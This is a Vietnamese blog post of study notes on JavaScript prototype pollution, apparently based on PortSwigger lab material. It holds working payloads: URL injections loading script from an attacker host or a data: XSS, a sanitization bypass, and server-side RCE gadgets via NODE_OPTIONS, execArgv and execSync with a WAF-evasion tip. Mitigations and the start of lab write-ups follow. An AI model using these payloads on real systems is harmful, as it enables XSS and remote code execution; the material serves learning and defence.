---
layout: post
title:  "Prototype Pollution"
date:   2025-09-12 12:00:00 +0700
tags: PortSwigger
categories: jekyll update
---

# Prototype Pollution 

## Prototype Pollution là gì ? 

Prototype pollution là 1 lỗ hổng JavaScript cho phép attacker thêm thuộc tính tùy ý vào các **prototype** của **object toàn cục**, và những thuộc tính này sau đó có thể được kế thừa bởi các **objects** các đối tượng do người dùng định nghĩa. 

Mặc dù **prototype pollution** thường ko thể khai thác trực tiếp như 1 lỗ hổng độc lập, nhưng nó cho phép kẻ tấn công kiểm soát **thuộc tính** của đối tượng vốn dĩ không thể truy cập được. 

Nếu ứng dụng đó xử lý 1 thuộc tính do attacker kiểm soát theo cách ko an toàn, thì điều này có thể được kết hợp các lổ hổng khác để khai thác. 

Ở phía client-side JavaScript, thông thường dẫn tới **DOM XSS**, trong khi đó ở phía server-side **prototype pollution** có thể dẫn tới RCE. 

## JavaScript prototypes và inheritance (kế thừa)

### Object trong JavaScript là gì? 

Object trong JavaScript là 1 collection của `key:value`. 

```javascript
const user = {
    username: "wiener",
    userId: 01234,
    isAdmin: false
}
``` 

Mình có thể lấy ra các thuộc tính đó bằng: 
```javascript
user.username // "wiener"
user['userId']
``` 

Và trong trường hợp thì value có thể là 1 hàm. Được gọi là **object literal**

```javascript
const user = {
    username: "wiener",
    userId: 01234,
    exampleMethod: function() {
        // do something
    }
}
```

### Prototype trong JavaScript là gì? 

Mỗi **object** trong Javascript đều được liên kết với 1 **object khác**, được gọi là **prototype**. Theo mặc định, JS tự động gán cho các **object** mới một trong các **prototype** tích hợp sẵn. 
Ví dụ, các chuỗi (string) được tự động gán `String.prototype`

```js
let myObject = {};
Object.getPrototypeOf(myObject); // Object.prototype

let myString = "";
Object.getPrototypeOf(myString); // String.prototype

let myArray = [];
Object.getPrototypeOf(myArray); // Array.prototype

let myNumber = 1; 
Object.getPrototypeOf(myNumber); // Number.prototype
```

Mỗi object trong JavaScript có một **prototype**, từ đó nó **kế thừa** thuộc tính và phương thức. Ví dụ, mỗi chuỗi đều tự động có phương thức `toLowerCase()` nhờ **String.prototype**, nên ko cần thêm 1 cách thủ công. 

## object hoạt động kế thừa như thế nào trong JavaScript? 

Khi truy xuất một thuộc tính của **object**, JavaScript sẽ trước tiên kiểm tra trên chính **object** đó. Nếu **object** không có thuộc tính đó, JavaScript sẽ tìm tiếp trên **prototype** của object. 
Với các **object** sau, điều này cho phép mình truy xuất, ví dụ như `myObject.propertyA`

![image](https://hackmd.io/_uploads/HJyKfL35gx.png)

Tóm lại:
- Khi mình truy cập `myObject.propertyC`, JavaScript tìm ngay trên `myObject` -> có sẵn -> trả về
- Khi mình truy cập `myObject.propertyA`, JavaScript tìm trên `myObject` -> không có -> tiếp tục tìm trên **prototype** (`existingObject`) -> có -> trả về 

Mình có thể thử trong dev tools. 

![image](https://hackmd.io/_uploads/HyJAoI3cge.png)

Mặc dù ko có định nghĩa gì, nhưng mà vẫn có 1 vài thuộc tính do kế thừa sẵn trong `Object.prototype`

## Prototype Chain 

Trong JavaScript:
- Mỗi **object** đều có một **prototype** (giống như cha)
- Prototype đó cũng lại là một **object**, nên nó cũng có lớp "cha" riêng. 
- Cứ lần ngược lên như vậy tạo thành **prototype chain**
- Cuối cùng, tất cả các chuỗi này đều dẫn về `Object.prototype` và "cha" của `Object.prototype` thì là `null` (nghĩa là hết rồi, ko còn gì nữa)

![image](https://hackmd.io/_uploads/BkFM1D2ceg.png)

Trong JavaScript, một object có thể mượn thuộc tính/phương thức từ "cha" của nó (**prototype**), không chỉ dừng lại ở cha, mà nó còn có thể leo lên cả ông, cụ,... trong **prototype chain** để tìm.

## Tiếp xúc prototype của object dùng `__proto__`

`__proto__` giống như 1 cửa sổ giúp mình xem **prototype** hiện tại hoặc **đổi** prototype cho object đó. 

```js
username.__proto__
username['__proto__']
``` 

Có thể tham chiếu như này nữa: 
```json
username.__proto__                     // String.prototype
username.__proto__.__proto__           // Object.prototype
username.__proto__.__proto__.__proto__ // null 
```

## Chỉnh sửa prototypes 

Trong JavaScript, `Array.prototype`, `String.prototype`, `Object.prototype`,... đều là **object bình thường** -> vì vậy có thể sửa hoặc thêm **method**

Vi dụ:
- Ngày nay trong JavaScript, chuỗi (String) có sẵn hàm `.trim()` -> để xóa khoảng trắng ở đầu và cuối chuỗi. 
- Nhưng hồi xưa (trước khi JavaScript cập nhật hàm này) muốn làm vậy thì lập trình viên phải tự thêm hàm `trim()` của riêng vào `String.prototype`

```Js
// Cách hiện nay 
let str = "     hello world      ";
console.log(str.trim()); 

// "hello world"

// Cách ngày xưa 
// Nếu trim chưa có thì thêm vào String.prototype 
if (!String.prototype.trim) {
    String.prototype.trim = function {
        return this.replace(/^\s+|\s+$/g, "");
    };
}

let str = "     hello world      ";
console.log(str.trim());

// "hello world"
```

## Prototype pollution xảy ra như thế nào? 

**Prototype pollution** xảy ra khi code JavaScript gộp (merge) dự liệu từ người dùng vào object mà không kiểm tra key trước. Kẻ tấn công có thể lợi dụng key đặc biệt như **__proto__** để chèn thuộc tính độc hại, ảnh hưởng đến toàn bộ ứng dụng. 

Khi merge object có key `__proto__`, các thuộc tính có thể bị chèn **prototype** thay vì object gốc. Điều này cho phép kẻ tấn công thêm giá trị độc hại vào prototype và ứng dụng có thể vô tình sử dụng chúng theo cách nguy hiểm. 

Nó có thể làm ô nhiễm bất kỳ prototype object nào, nhưng thường gặp nhất là với **Object.prototype** toàn cục (global) được tích hợp sẵn trong JavaScript.

## Prototype pollution source 

Protocol pollution source là bất kỳ dữ liệu đầu vào do người dùng kiểm soát mà cho phép thêm các thuộc tính tùy ý vào các prototype object. Các source phổ biến là:
- URL thông qua query string hoặc fragment/hash 
- Dữ liệu JSON 
- Web messages 

### Prototype pollution vi the URL 

Xem xét qua URL, trong đó có chứa 1 **query string** được kẻ tấn công tạo ra: 
```URL
https://vulnerable-website.com?__proto__[evilProperty]=payload
```

Khi mà break các query string thành `key:value`, trình phân tích URL có thể xem `__proto__` như một chuỗi bình thường. Sẽ ra sao nếu những key và value này sau đó được merge vào một object hiện có dưới dạng thuộc tính. 

Mình có thể nghĩ rằng thuộc tính `__proto__`, cùng với thuộc tính lồng bên trong là `evilProperty`, sẽ chỉ được thêm vào đối tượng mục tiêu như sau: 

```json
{
    existingProperty1: 'foo',
    existingProperty2: 'bar',
    __proto__: {
        evilProperty: 'payload'
    }
}
```

Tuy nhiên, thực tế là không phải như vậy. Ở một thời điểm nào đó, quá trình merge đệ quy có thể gán giá trị của `evilProperty` bằng một câu lệnh tương đương như sau:
`targetObject.__proto__.evilProperty = 'payload';`

Khi ứng dụng parse và merge object có chứa key `__proto__`, thì JavaScript engine sẽ coi `__proto__` như **getter cho prototype**

Kết quả thay vì gán `evilProperty` vào object mục tiêu, nó lại được gán vào **Object.prototype**. Vì hầu hết object trong JavaScript đều kế thừa từ **Object.prototype**, nên mọi object trong runtime đều sẽ có thêm thuộc tính **evilProperty**

### Prototype pollution via JSON input 

Ngay cả khi dữ liệu đầu vào là **JSON hợp lệ**, nếu trong đó có key `__proto__`, sau khi **JSON.parse()** và merge vào object, nó vẫn có thể dẫn đến prototype pollution. 

Attacker có thể inject JSON độc hại, thông qua web message: 

```JSON
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

Nếu đổi sang thành JavaScript object thông qua `JSON.parse()` method, thì `JSON.parse()` không chặn `__proto__`, nó vẫn coi đó là một key hợp lệ -> sau đó nếu mình merge object này, nguy cơ prototype pollution vẫn xảy ra. 

```javascript
const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

objectLiteral.hasOwnProperty('__proto__'); // false 
objectFromJson.hasOwnProperty('__proto__'); // true 
``` 

Nếu object được tạo ra từ `JSON.parse()` sau đó được merge vào một object hiện có mà **không kiểm tra key**, thì điều này cũng sẽ dẫn đến **prototype pollution** trong quá trình gán. 

## Prototype pollution sinks 

**Sinh** là nơi mà dữ liệu ô nhiễm từ pollution có thể được dùng để thực thi code hoặc lệnh. 

Prototype pollution giúp attacker điều khiển các thuộc tính "ẩn", từ đó vươn tới nhiều sink nguy hiểm. 

Dev thường chủ quan, nghĩ các thuộc tính này an toàn -> dẫn đến lọc/santization yếu. 

## Prototype pollution gadgets 

**Gadget** cầu nối từ prototype pollution -> exploit

Điều kiện: thuộc tính phải vừa được app dùng nguy hiểm, vừa có thể bị chèn qua prototype.

Nếu object có sẵn thuộc tính hoặc prototype bị set `null` -> không còn gadget. 

### Ví dụ prototype pollution gadgets 

Các thư viện hay merge **config object** của dev với default config, và đây là một tình huống điển hình dễ bị **prototype pollution** nếu ko lọc key. 

```javascript
let transport_url = config.transport_url || defaults.transport_url; 
```

Giờ tưởng tượng thư viện code dùng `transport_url` để add vào script tham chiếu đến page: 

```javascript
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

Nếu dev ko set `config.transport_url` thì JS sẽ fallback -> lấy từ prototype. 
Attacker pollute `Object.prototype.transport_url = "http://evil.com"`, config kế thừa -> script tải JS từ domain attacker. Dẫn tới XSS / chiếm quyền thực thi. 

Nếu prototype có thể bị ổ nhiễm thông qua một query parameter, ví dụ, thì attacker tấn công chỉ cần dụ nạn nhân truy cập 1 URL được chế tạo đặc biệt là có thể khiển trình duyệt nạn nhân tải và thực thi một file JavaScript độc hai từ domain do kẻ tấn công kiểm soát. 

```URL 
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
``` 

Bằng cách cung cấp `data:` URL, attacker có thể nhúng payload XSS vào trong query.

```URL 
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);// 
``` 

Cái `//` là để comment lại đề phòng phía sau còn nữa thì có thể làm hỏng payload như `/example.js`

## Client-side prototype pollution vulnerabilities 

## Finding client-side prototype pollution sources manually 

Việc tìm nguồn prototype pollution thủ công chủ yêu là **thử và sai (trial and error)**, mình cần thử nhiều cách khau để thêm một thuộc tính tùy ý vào **Object.prototype**, cho đến khi tìm được một source cho phép điều này hoạt động. 

Các bước cần test prototype pollution như sau: 

1. Inject thuộc tính thông qua query String, URL fragment, và bất kỳ JSON input. 
`vulnerable-website.com/?__proto__[foo]=bar`
2. Trong trình duyệt, inspect `Object.prototype` để nhìn thấy nếu thành công thì đã polluted
```
Object.prototype.foo 

// Nếu mà xuất hiện "bar"  thì đã thành công 
// Còn xuất hiện undefine là thất bại 
``` 
3. Nếu thuộc tính không được thêm vào trong prototype, thử dùng kỹ thuật khác, như là đổi thành dấu chấm thay vì là dấu `[]`
`vulnerable-website.com/?__proto__.foo=bar`
4. Lặp lại quá trình. 

## Finding client-side prototype pollution source using DOM invader 

Dùng DOM invader để làm: 
- Inject thử các payload prototype pollution 
- Kiểm tra kết quả trong `Object.prototype`
- Báo cáo cho mình khi tìm thấy source khả nghi. 

## Finding client-side prototype pollution gadgets manually 

1. Xác định property nghi ngờ: 
- Đọc source code hoặc JS trong response 
- Tìm các property mà app hoặc library sử dụng -> đây có thể là gadget
2. Chặn và chỉnh sửa script bằng Burp 
- Vào **Proxy -> Options -> Intercept server responses** để bật chặn response.
- Chặn response chửa file JavaScript. 
- Thêm dòng **debugger;** vào đầu file JS để khi chạy sẽ dừng tại đó
- Forward request/response cho script chạy tiếp
3. Khi Script dừng, chèn gadget test vào console: 
```javascript
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
    get() {
        console.trace();
        return 'polluted';
    }
})
```
- Thay **YOUR-PROPERTY** bằng property nghi ngờ.
- Nếu app hoặc lib có truy cập property này -> console sẽ hiện **stack trace**
4. Tiếp tục chạy script 
- Nhấn resume (continue execution)
- Nếu thấy stack trace -> property đang được dùng trong app 
5. Phân tích stack trace
- Click để nhảy đến dòng code liên quan 
- Dùng debugger step-by-step để xem property này có đi tới **sink nguy hiểm** (như **innerHTML**, **eval()**, **script.src**) hay không
6. Lặp lại với property khác 
- Test nhiều property khác nhau cho đến khi tìm ra gadget có thể khai thác

## Finding client-side prototype pollution gadgets using  DOM Invader 

DOM invader có thể:
- Tự động scan để tìm gadget
- Xác định gadget nào có thể bị lợi dụng
- Trong một số trường hợp còn sinh ra PoC DOM XSS. 

## Prototype pollution thông qua constructor 

Bằng việc thực hiện qua `__proto__` thôi là chưa đủ vì có thể sẽ bị filter. 

- Hầu hết object trong JavaScript đều có thuộc tính `constructor`
-`constructor` trỏ đến hàm đã tạo ra object đó. 
- Có thể tạo object bằng `{}` hoặc bằng `new Object()`

```javascript
let myObjectLiteral = {};
let myObject = new Object();
```

Mình có thể tham chiếu tới `Object()` constructor thông qua đã build thuộc tính `contructor`:

```javascript
myObjectLiteral.constructor      // function Object() {...}
myObject.constructor            // function Object() {...}
```

Hàm trong Javascript cũng là một object. Mỗi `constructor function` có thuộc tính `.prototype`, thuộc tính này xác định prototype cho các object được tạo từ `constructor` đó. Nhờ vậy, mình có thể truy cập prototype của object thông qua `obj.constructor.prototype`

```javascript
myObject.constructor.prototype // Object.prototype
myString.constructor.prototype // String.prototype
myArray.constructor.prototype // Array.prototype
```

Và `myObject.constructor.prototype` tương đương với `myObject.__proto__`, đây là cửa ngõ khác.

## Bypassing flawed key sanitization 

Khi mà để ngăn chặn prototype pollution bằng cách sanitize thuộc tính key trước khi merge vào trong những object tồn tại. 
Tuy nhiên vẫn có thể có lỗi khi sanitize input string. Ví dụ: 
```URL
vulnerable-website.com/?__pro__proto__to__.gadget=payload
```

Nếu mà quá trình xóa chuỗi mà ko lặp lại thì nó vẫn dẫn tới như sau:
```URL
vulnerable-website.com/?__proto__.gadget=payload
```

## Prototype pollution trong External libraries 

Thường thì nếu ko do dev tự code thì nó vẫn có thể xảy ra trong thư viện bên ngoài. Nhưng thường thì nó sẽ rất nhiều. Cho nên dùng **DOM invader** để có thể xác định nó nhanh hơn.

## Prototype pollution thông qua browser APIs

### [PortSwigger Research - Widespread prototype pollution gadgets by Gareth Heyes](https://portswigger.net/research/widespread-prototype-pollution-gadgets)

## Prototype pollution thông qua `fetch()` 

Hàm `fetch()` trong URL:
- URL mà mình muốn gửi request 
- `options` là một object truyền vào fetch() để cấu hình request (GET/POST, header, dữ liệu gửi, chế độ CORS, timeouts...)

```javascript
fetch('https://normal-website.com/my-account/change-email', {
    method: 'POST',
    body: 'user=calors&email=carlos%40juice.shop'
});
```

Nếu attacker pollute `Object.prototype` (ví dụ thêm headers), fetch(options) có thể vô tình dùng header do attacker cung cấp — vì vậy luôn chuẩn hóa/validate/clone options trước khi gửi request.

Điều này dẫn tới DOM XSS thông qua **prototype pollution**: 

```javascript
fetch('/my-products.json',{method:"GET"})
    .then((response) => response.json())
    .then((data) => {
        let username = data['x-username'];
        let message = document.querySelector('.message');
        if(username) {
            message.innerHTML = `My products. Logged in as <b>${username}</b>`;
        }
        let productList = document.querySelector('ul.products');
        for(let product of data) {
            let product = document.createElement('li');
            product.append(product.name);
            productList.append(product);
        }
    })
    .catch(console.error);
```

Để khai thác, attacker có thể pollute `Object.prototype` với thuộc tính `headers` bao gồm header `x-username` độc hại như sau: 

`?__proto__[headers][x-username]=<img/src/onerror=alert(1)>`

Giả sử phía server, header này được dùng để gán giá trị cho thuộc tính `x-username` trong tệp JSON trả về. Trong mã phía client dễ bị tổn thương ở trên, giá trị này sau đó được gán cho biến username, và biến đó được truyền vào innerHTML — dẫn đến DOM XSS. 

## Prototype pollution thông qua `Object.defineProperty()`

Một số dev với kiến thức phòng tránh **prototype pollution** thì dùng `Obejct.defineP`

## Server-side prototype pollution 

### [PortSwigger Research - Server-side prototype pollution: Black-box detection without the Dos](https://portswigger.net/research/server-side-prototype-pollution)

## Tại sao prototype pollution phía server-side lại khó phát hiện hơn? 

- Kiểm tra prototype pollution trên server khó hơn vì mình **không được xem source code, không debug trực tiếp, và thay đổi có thể phá hỏng server** hoặc **tồn tại lại** sau khi thử.
- Rủi ro lớn nhất là vô tình làm sập hệ thống (DoS) hoặc gây thay đổi không thể dễ dàng hoàn tác. 
- Vì vậy, cần dùng **kỹ thuật không phá hủy** (non-destructive) khi thử trên server - tức là thử theo cách an toàn, tránh làm hỏng ứng dụng và tránh thay đổi lâu dài trong tiến trình.

## Detecting server-side prototype pollution thông qua polluted property reflection 

Một cái bẫy khiến dev mắc phải là quên hoặc bỏ sót việc vòng lặp `for ... in` trong JavaScript sẽ duyệt qua tất cả các thuộc tính có thể liệt kê (enumerable properties) của một object, bao gồm cả những thuộc tính mà nó kế thừa từ **prototype chain**

Có thể test ví dụ như sau: 

```javascript
const myObject = { a : 1, b : 2};

// pollute the prototype with an arbitrary property 

Object.prototype.foo = 'bar'; 

// confirm myObject doesn't have its own foo property 

myObject.hasOwnProperty('foo'); // false 

// list names of properties of myObject 
for (const propertyKey in myObject) {
    console.log(propertyKey);
}

// Output: a, b, foo
```

Nó cũng áp dụng cho array, nó sẽ duyệt qua từng chỉ số, sau đó duyệt qua các thuộc tính được kế thừa từ **prototype** 

```javascript
const myArray = ['a', 'b'];
Object.prototype.foo = 'bar'; 

for (const arrayKey in myArray) {
    console.log(arrayKey);
}

// Output: 0, 1, foo 
```

Các request `POST` hoặc `PUT` gửi dữ liệu JSON tới ứng dụng hoặc API là mục tiêu hàng đầu cho hành vi này vì server thường trả về JSON biểu diễn của object mới hoặc được cập nhật. Trong trường hợp đó, có thể cố gắng pollute `Object.prototype` bằng một thuộc tính tùy ý như sau: 

```HTTP
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "foo":"bar"
    }
}
```

Nếu website có lỗ hổng, thì thuộc tính mình inject nó sẽ xuất hiện trong response: 

```HTTP
HTTP/1.1 200 OK 
...
{
    "username":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "foo":"bar"
}
```

Trong những trường hợp hiếm, thì website có thể dùng thuộc tính này để render HTML, kết quả là thuộc tính đã inject được render trong browser. 

Nếu server bị **prototype pollution**, những chỗ **cập nhật dữ liệu user** có thể bị lợi dụng. Nếu bạn thêm thuộc tính tuỳ ý vào object user, có thể gây tăng quyền hoặc các lỗ hổng khác.

## Detecting server-side prototype pollution without polluted property reflection 

- Khi pollute prototype server, **thường không thấy thuộc tính xuất hiện trong response**
- Cách dò an toàn: chèn các thuộc tính giống cấu hình server rồi quan sát thay đổi hành vi (vd: status code, JSON spacing, charset)
- Nếu server phản ứng khác sau injection, đó là **dấu hiệu thành công**
- Các kỹ thuật này **không phá hủy** nhưng giúp xác định lỗ hổng một cách an toàn.

### Status code override 

Server-side JavaScript framework giống Express cho phép dev tự custom trạng thái HTTP response. 
Khi có lỗi, server có thể trả **mã trạng thái chung**, nhưng đồng thời gửi **object lỗi dạng JSON** trong body để cung cấp chi tiết về nguyên nhân lỗi, vì mã HTTP mặc định ko đủ rõ. 

Dù gây hiểu lầm, nhưng khá thường gặp là server trả **200 OK** nhưng trong **body** lại chứa object lỗi với mã trạng thái khác. 

```HTTP
HTTP/1.1 200 OK
...
{
    "error": {
        "success": false,
        "status": 401,
        "message": "You do not have permission to access this resource."
    }
}
```

Thì `http-erros` là module theo hàm sau tạo ra lỗi của response:

```javascript
function createError () {
    //...
    if (type === 'object' && arg instanceof Error) {
        err = arg
        status = err.status || err.statusCode || status
    } else if (type === 'number' && i === 0) {
    //...
    if (typeof status !== 'number' ||
    (!statuses.message[status] && (status < 400 || status >= 600))) {
        status = 500
    }
    //...
```

Đây là lí do tạo cơ hội **prototype pollution** vì nếu input là một object lỗi (**Error**), lưu object đó vào `err`
Lấy `status` từ:
- `err.status` => nếu object lỗi có property `status`
- `err.statusCode` => nếu object lỗi có property `statusCode`
- fallback `status` => giá trị mặc định đã định trước
Nhưng nếu object lỗi **không có** `status` hay `statusCode`, JS sẽ tiếp tục truyền tìm trong **prototype chain**

Nếu mà phải chọn **status code từ 400 - 599**:
- Nên chọn số ngoài khoảng này, Node sẽ mặc định gán 500
- Khi đó, mình sẽ ko bít **prototype pollution có thành công hay không**, vì status luôn bị override.

### JSON spaces override 

Express có option `json spaces` để định số khoảng trắng (indent) khi trả JSON.
Nhiều dev **không đặt giá trị**, nên property này dễ bị **pollute** qua **prototype**
Cách dò: 
1. pollute prototype với `json spaces` (vd: 8 spaces)
2. Gửi lại request JSON -> nếu indentation tăng, chứng tỏ pollution thành công. 
3. Có thể reset về mặc định để tắt, test lại -> rất an toàn, ko phá hủy

Kỹ thuật này **ko cần property hiển thị trong response** và vẫn dò được prototype pollution. Lưu ý: **Express < 4.17.4 vẫn có nguy cơ, các phiên bản mới đã fix**

### Charset override 

Express thay dùng các `middleware` để xử lý request trước khi gửi đến handler.
Ví dụ: `body-parser` tạo ra `req.body` từ body của request
Đây là một **gadget tiềm năng** để dò **server-side prototype prototype pollution**, vì mình có thể chèn thuộc tính vào prototype và quan sát ảnh hưởng lên `req.body`

Đoạn code truyền một **options object** vào hàm `read()` để đọc body của request.
Một option là `encoding`, xác định **character encoding** dùng để parse body. 
Giá trị **encoding** lấy từ request (`getCharset(req)`) hoặc mặc định là **UTF-8**

```javascript
var charset = getCharset(req) or 'utf-8'

function getCharset(req) {
    try {
        return (contentType.parse(req).parameters.charset || '').toLowerCase()
    } catch(e) {
        return undefined
    }
}

read(req, res, next, parse, debug, {
    encoding: charset, 
    inflate: inflate, 
    limit: limit, 
    verify: verify
})
```

Hàm **getCharset()** check xem header `Content-Type` có **charset** ko 
Nếu ko có, hàm sẽ trả về **empty string**
Quan trọng: vì giá trị có thể không được set trực tiếp, nên attacker có thể kiểm soát `charset` qua **prototype pollution**

Nếu mình tìm được **object mà các thuộc tính của nó xuất hiện trong response**, mình có thể dùng để **dò prototype pollution**

Ví dụ: **UTF-7 encoding** kết hợp **JSON response** để test và quan sát sự thay đổi

1. Thêm thuộc tính `UTF-7` encoded string vào thuộc tính mà nó phản chiếu trong response. Ví dụ, foo trong UTF-7 là `+AGYAbwBv-`

```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"+AGYAbwBv-"
}
```

2. Gửi request. Server sẽ ko dùng UTF-7 encoding theo mặc định, string sẽ xuất hiện trong response mà nó được encoded form. 
3. Thử pollute prototype với thuộc tính `content-type` mà chỉ định các ký tự UTF-7:

```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
}
```
4. Repest cho request đầu tiên. Nếu thành công, chuỗi UTF-7 sẽ được decode trong response: 
```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"foo"
}
```

Do một lỗi trong module `_http_incoming` của Node, kỹ thuật này vẫn hoạt động ngay cả khi **request thực sự có header** `Content-Type` kèm **charset riêng**

Để tránh ghi đè các thuộc tính khi request có header trùng, hàm `_addHeaderLine()` sẽ kiểm tra xem object đã có thuộc tính cùng key chưa trước khi chuyển giá trị vào object **IncomingMessage**

```javascript
IncomingMessage.prototype._addHeaderLine = _addHeaderLine; 
function _addHeaderLine(field, value, des) {
    //..
} else if (dest[field] === undefined) {
    // Drop duplicates
    dest[field] = value;
}
``` 

## Scanning for server-side prototype pollution sources 

Cài đặt extension `Server-Side Prototype Pollution Scanner`. 

## Bypassing input filters for server-side prototype pollution 

Các ứng dụng Node cũng có thể xóa hoặc vô hiệu hoá `__proto__` hoàn toàn bằng các cờ dòng lệnh `--disable-proto=delete` hoặc `--disable-proto=throw` tương ứng. Tuy nhiên, điều này vẫn có thể bị bypass bằng kỹ thuật constructor.

## RCE thông qua server prototype pollution 

### Identifying a vulnerable request 

Nhiều sink thực thi lệnh nằm trong `child_process`. Chúng thường bị gọi bất đồng bộ so với request gây pollution, nên khó phát hiện. 

Kỹ thuật phát hiện hữu ích: pollute prototype bằng payload tương tác với Burp Collaborator để khi sink được gọi. 

**NODE_OPTIONS** và vector nguy hiểm vì nó được đọc từ `process.env` - nếu attacker đặt được `NODE_OPTIONS` qua prototype pollution, họ có thể chèn tham số dòng lệnh cho mọi tiến trình Node mới. 

Kết hợp `shell` của `child_process` + `NODE_OPTIONS` độc hại có thể khiến mỗi tiến trình con thực hiện lệnh do attacker kiểm soát (và kích hoạt tương tác với Burp Collaborator để dễ phát hiện)

```json
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
``` 

Bằng cách này, mình có thể dễ dàng nhận biết khi nào một request tạo ra một tiến trình con mới có các tham số dòng lệnh có thể bị điều khiển thông qua prototype pollution.

Ý là việc thêm dấu ``\"`` quanh tên máy chủ không bắt buộc về mặt kỹ thuật, nhưng thường được dùng để che mắt các hệ thống phát hiện (ví dụ WAF) nhằm giảm khả năng bị phát hiện khi thử nghiệm.

### RCE thông qua `child_process.fork()`

- `child_process.spawn()/fork()/execSync()` là những sink có thể dẫn tới thực thi lệnh trên Node. 
- `fork()` nhận `options.execArgv` (mảng chuỗi). Nếu `execArgv` để **undefined** và attacker pollute prototype, có thể điều khiển mảng này. 
- Khác với `NODE_OPTIONS`, `execArgv` cho phép truyền trực tiếp đổi số của tiến trình con - ví dụ `--eval` để chạy JavaScript tùy ý trong child process.
- Nếu attacker đặt `execArgv` thành `["--eval=require('...')"]` thì child process sẽ load/thi thành payload do attacker chỉ định. 
- Kết hợp khả năng inject javascript vào child (qua `--eval`) với lệnh hệ thống kiểu `execSync()` có thể leo thang từ prototype pollution thành RCE trên server. 

```json
"execArgv": [
    "--eval=require('<module>')"
]
```

### RCE thông qua `child_process.execSync()`

`execSync()` có `options` có thể bị prototype pollution. 

Bằng cách pollute cả `input` (lệnh truyền qua stdin) và `shell` (chọn shell thực thi) trong `execSyn()`, attacker có thể inject command vào child_process, ngay cả khi `execArgv` ko có. 

`execSync()` thường chạy với flag `-c` nghĩa là sẽ kiểm tra rồi mới chạy lệnh.

Với mình cũng có thể chạy shell trên file vim nếu trên server đã cài: 

```json
"shell":"vim",
"input":""
```

Một số chương trình ko đọc stdin -> mình phải ép chúng đọc stdin hoặc chuyển stdin thành tham số. 
`curl -d @-` cho phép gửi nội dung stdin thành body POST.
`xargs` biến stdin thành tham số cho lệnh khác.

## Preventing prototype pollution vuln 

## Sanitizing property keys 

- Lọc key trước khi merge giúp ngăn `__proto__`.

- Allowlist là tốt nhất; blocklist phổ biến nhưng dễ sai sót.

- Blocklist có thể bị bypass (ví dụ qua constructor hoặc obfuscation) → chỉ nên dùng tạm thời, cần biện pháp an toàn hơn lâu dài.

## Preventing changes to prototype objects 

Chặn thay đổi bằng `Object.freeze(Object.prototype)`
- Freeze: không thể sửa, xóa, hay thêm thuộc tính 
- Seal: Ko thêm/xóa được thuộc tính mới, nhưng vẫn đổi giá trị thuộc tính cũ. 
- Freeze = bảo mật cao nhất, Seal = thỏa hiệp khi cần linh hoạt 

## Preventing an object from inheriting properties 

Ngoài `freeze` prototype, tốt nhất là loại bỏ các gadget bằng cách tạo object ko kế thừa (Object.create(null)), làm giảm khả năng exploit ngay cả khi có pollution. 

```javascript
let myObject = Object.create(null);
Object.getPrototypeOf(myObject); // null
```

## Using safer alternatives where possible 

Dùng `Map` thay cho object thông thường khi cần lưu `options`
`Map.get()` chỉ trả về key trong chính `Map`, ko bị ảnh hưởng bởi prototype pollution. 

```javascript
Object.prototype.evil = 'polluted';
let options = new Map();
options.set('transport_url', 'https://normal-website.com');

options.evil;             // polluted 
options.get('evil');     // undefined 
options.get('transport_url');  // 'https://normal-website.com'
``` 

**Set**: dùng khi chỉ cần lưu giá trị (ko cần key) 
An toàn vì các method (add, has, values, ...) chỉ làm việc trên dữ liệu thật trong `Set`, ko bị prototype pollution. 

```javascript
Object.prototype.evil = 'polluted';
let options = new Set();
options.add('safe');

options.evil;             // polluted 
options.has('evil');      // false  
options.has('safe');     // true
```

# Các bài LAB 
## LAB01 - DOM XSS via client-side prototype pollution 

**Cách Manual**

Xác định có **prototype pollution**, thử inject vào `?__proto_[foo]=bar`. Sau đó, trong console tab trên trình duyệt thì nhập `Object.prototype`

![image](https://hackmd.io/_uploads/ByV_tLT9ex.png)


Sau đó, tìm trong tab source thì thấy có file `searchLogger.js` 

```javascript
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }

    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

window.addEventListener("load", searchLogger);
```

Quan sát trong khi định nghĩa `config` chỉ có thuộc tính `params` và không có `transport_url`. Nhưng `transport_url` dùng để tạo ra thẻ `<script>` 

Như vậy, khi mình tiêm vào 1 prototype là `transport_url` và có chứa nội dung thì nó hoàn toàn tìm trong prototype và in ra theo data mình kiểm soát.

![image](https://hackmd.io/_uploads/HJOCnLaqeg.png)

![image](https://hackmd.io/_uploads/rko1a8a5ge.png)

**Cách DOM invader**

Mình sẽ bật DOM invader và mode attacker là Prototype pollution. Sau đó, reload lại page. 

![image](https://hackmd.io/_uploads/Hyu5kPp9gl.png)

Sau đó chọn **Scan for gadgets**

![image](https://hackmd.io/_uploads/rJVloo6qgl.png)

![image](https://hackmd.io/_uploads/HJT-ijpclx.png)

Cuối cùng là ấn exploit 

![image](https://hackmd.io/_uploads/S1BFsopqxg.png)

![image](https://hackmd.io/_uploads/rk45soa5gl.png)

## LAB02 - DOM XSS via an alternative prototype pollution vector 

**Cách Manual**

Đầu tiên, mình cần xác định có thêm vào **prototype** ko. 

![image](https://hackmd.io/_uploads/BJc99zrole.png)

Thấy có hiển thị nên hoàn toàn có thể bị **prototype pollution**

